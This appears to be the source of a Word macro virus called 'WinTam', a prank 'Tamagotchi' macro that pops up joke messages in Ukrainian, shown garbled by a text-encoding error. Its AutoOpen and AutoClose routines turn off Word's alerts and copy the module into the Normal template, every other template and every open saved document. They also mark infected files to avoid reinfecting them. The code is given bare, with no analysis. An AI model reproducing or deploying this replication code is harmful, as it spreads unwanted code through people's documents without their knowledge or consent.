   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "WinTam"
   Const CountMessage = 4
   Dim Message(CountMessage)
   Dim Answer(CountMessage)
   Dim Exec(CountMessage)
   Dim Text(CountMessage)


   Sub Init()
       Message(0) = "Òàìàãî÷³ õî÷å ñïàòè. Çàêðèéòå âñ³ àêòèâí³ ïðîãðàìè ³ íàòèñí³òü êíîïêó Reset..."
       Answer(0) = "ß áóäó ïëàêàòè !"
       Exec(0) = ""
       Text(0) = "ß âæå ïëà÷ó ... Å - Å - Å   ÅÅÅÅÅ  Å ÅÅ åå  ÅÅ ..."

       Message(1) = "Òàìàãî÷³ ãîëîäíèé. Âñòàâòå áóòåðáðîä ç³ ñàëîì ó äèñêîâîä À:..."
       Answer(1) = "Òàìàãî÷³ ïî÷èíàº ¿ñòè " + ActiveDocument.Name
       Exec(1) = ""
       Text(1) = "Ãàì ! Ãàì ! Ãàì !"

       Message(2) = "Òàìàãî÷³ õî÷å ïîãðàòèñÿ â DOOM2. Ñêàæ³òü áàõ, ÿ çäàþñÿ..."
       Answer(2) = "Íàòèñí³òü IDDQD ³ ïðîäîâæóºìî DOOMàòè!"
       Exec(2) = ""
       Text(2) = "IDDQD IDKFA"

       Message(3) = "Òàìàãî÷³ ãîòîâèòüñÿ ñòàòè ì³íåðîì. Ïîïðîáóéòå çíàéòè, äå ñõîâàâñÿ Òàìàãî÷³..."
       Answer(3) = "Ñàïåðîì ìîæåø òè íå áóòè, òà â³ääèõàòè âñå æ ïîòð³áíî!"
       Exec(3) = "WinMine.exe"
       Text(3) = "Áóõ !"

       Message(4) = "Ïèòàííÿ â³ä Òàìàãî÷³. Ñê³ëüêè áóäå 2+2 ?..."
       Answer(4) = ""
       Exec(4) = "Calc.exe"
       Text(4) = "2+2=?"

       Ans = MsgBox("Ïîçäîðîâëÿºìî Âàñ. Âè óñèíîâèëè Òàìàãî÷³ íà äàíèé ñåàíñ ðîáîòè! Ïðîõàííÿ áåðåãòè éîãî, ãîäóâàòè, íå çàëèøàòè â õîëîäíîìó ì³ñö³!", vbOKOnly + vbInformation, "Microsoft Word", "", 0)

       Application.OnTime When:=Now + TimeValue("00:03:00"), Name:="QUEST"
   End Sub

   Sub AutoOpen()

       Application.OnTime When:=Now + TimeValue("00:15:00"), Name:="Init"

       Application.DisplayAlerts = wdAlertsNone

       For Each AutoText In NormalTemplate.AutoTextEntries
           If AutoText.Name = "Òàìàãî÷³" Then Exit Sub
       Next AutoText

       Set AT = NormalTemplate.AutoTextEntries.Add("Òàìàãî÷³", Selection.Range)
       Application.OrganizerCopy Source:= _
          ActiveDocument.FullName, Destination:= _
          NormalTemplate.FullName, Name:="WinTam", Object:=wdOrganizerObjectProjectItems

   End Sub

   Sub AutoClose()

       For Each Templ In Templates

       For Each AutoText In Templ.AutoTextEntries
           If AutoText.Name = "Òàìàãî÷³" Then GoTo NoInfectedTemplate
       Next AutoText

       Set AT = Templ.AutoTextEntries.Add("Òàìàãî÷³", Selection.Range)
       Application.OrganizerCopy Source:= _
          NormalTemplate.FullName, Destination:= _
          Templ.FullName, Name:="Òàìàãî÷³", Object:=wdOrganizerObjectProjectItems

   NoInfectedTemplate:
       Next Templ

       For Each Docs In Documents

           For C = 1 To Docs.Versions.Count
               If Docs.Versions(C).Comment = "Òàìàãî÷³" Then GoTo NoInfectedDoc
           Next C

           If Docs.Type = wdTypeTemplate Then GoTo NoInfectedDoc

           If Docs.Path <> "" Then Application.OrganizerCopy Source:= _
               NormalTemplate.FullName, Destination:= _
               Docs.FullName, Name:="WinTam", Object:=wdOrganizerObjectProjectItems: _
               Docs.Versions.Save Comment:="Òàìàãî÷³": Docs.AttachedTemplate = ""

   NoInfectedDoc:
       Next Docs

   End Sub

   Sub Test()
       OnTime
   End Sub
